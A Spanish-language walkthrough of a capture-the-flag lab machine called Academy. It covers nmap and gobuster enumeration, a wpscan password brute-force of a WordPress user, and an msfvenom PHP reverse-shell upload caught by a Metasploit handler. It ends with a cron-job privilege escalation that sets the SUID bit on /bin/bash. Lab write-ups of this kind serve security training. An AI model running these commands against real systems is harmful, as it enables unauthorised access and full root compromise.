---
tags:
  - Cybersecurity
  - Labs
  - TheHackerLabs
  - Easy
  - Linux
  - WordPress
  - FileUpload
  - PrivilegeEscalation
  - CRON
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#WordPress|WordPress]]
	- [[#Explotación#Escalada de privilegios|Escalada de privilegios]]
	- [[#Explotación#Tareas CRON|Tareas CRON]]

---
# Resolviendo la máquina Academy

>En esta publicación, comparto cómo resolví la máquina **Academy** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/1).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.136`

![[Pasted image 20250720182702.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.136 -oG allPorts`

![[Pasted image 20250720182819.png]]

`nmap -p22,80 -sCV 192.168.1.136 -oN targeted`

![[Pasted image 20250720182845.png]]
### HTTP

`http://192.168.1.136/`

![[Pasted image 20250720183319.png]]
#### Fuzzing Web

`gobuster dir -u http://192.168.1.136/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250720183420.png]]

`http://192.168.1.136/wordpress/`

![[Pasted image 20250720183511.png]]

Se observa que no carga correctamente.

![[Pasted image 20250720183602.png]]

Se añade el dominio al archivo `/etc/hosts`

`echo "192.168.1.136 academy.thl" >> /etc/hosts`

![[Pasted image 20250720183822.png]]

Se vuelve a realizar *Fuzzing Web*.

`gobuster dir -u http://192.168.1.136/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250720184105.png]]

Se accede al directorio: `http://192.168.1.136/wordpress/wp-admin`.

![[Pasted image 20250720184235.png]]

---
## Explotación
### WordPress

`wpscan --url http://192.168.1.136/wordpress/ --enumerate u,vp`

![[Pasted image 20250720184508.png]]
![[Pasted image 20250720184538.png]]

Se encuentra el usuario *dylan*.

`wpscan --url http://192.168.1.136/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames dylan`

![[Pasted image 20250720184852.png]]
![[Pasted image 20250720184913.png]]

Se introduce la contraseña en el panel de control de *WordPress*.

![[Pasted image 20250720185010.png]]

Se genera un *payload malicioso*.

`msfvenom -p php/reverse_php LHOST=192.168.1.127 LPORT=1234 -f raw > pwned.php`

Se sube el archivo generado anteriormente, mediante *Bit File Manager*.

![[Pasted image 20250720190008.png]]

Nos ponemos en escucha en el puerto 1234.

`nc -nlvp 1234`

`http://192.168.1.136/wordpress/pwned.php`

Se crea un script automático para ejecutar el *multi/handler*.

`vin handler.rc`

```
use multi/handler
set LHOST 192.168.1.127
set LPORT 1234
run
```

`msfconsole -r handler.rc`

Cuando se recibe la conexión en el puerto de 1234, se realiza una *reverse shell* para establecer una conexión estable.

![[Pasted image 20250720190823.png]]

![[Pasted image 20250720190846.png]]

`background`

`sessions -u 1`

`sessions 2`

`sysinfo`

![[Pasted image 20250720191034.png]]

`getuid`

![[Pasted image 20250720191052.png]]
### Escalada de privilegios

`cd /opt`

`cat backup.py`

![[Pasted image 20250720192608.png]]

Se encuentra la contraseña del usuario *dylan*, con el cual se accedió previamente a **WordPress**, aunque dicho usuario no existe como cuenta local en el sistema.
### Tareas CRON

Se descarga la herramienta [pspy64](https://github.com/DominicBreuker/pspy). 

Para poder ver las tareas **CRON** que se ejecutan en la máquina víctima.

Se descarga en nuestra máquina.

Se mueve el archivo descargado al directorio actual.

`mv /home/manumore/Descargas/pspy64 .`

`python3 -m http.server 80`

Se descarga en la máquina victima y se dan permisos.

`wget 192.168.1.127/pspy64`

`chmod 777 pspy64`

Se ejecuta el archivo descargado.

`./pspy64`

Se observa una tarea **CRON**, pero que el archivo que llama no existe en la ruta que indica.

![[Pasted image 20250720200322.png]]

Al tener permisos de escritura sobre `/opt`, se puede abusar de la tarea **CRON** que busca ejecutar un script inexistente (`backup.sh`).

![[Pasted image 20250720200607.png]]

Se crea el archivo: `backup.sh`.

`echo 'chmod u+s /bin/bash' >> backup.sh`

Se da permisos.

`chmod +x backup.sh`

Se espera a que se ejecuta la tarea **CRON** se ejecute automáticamente.

`bash -p`

![[Pasted image 20250720201622.png]]

---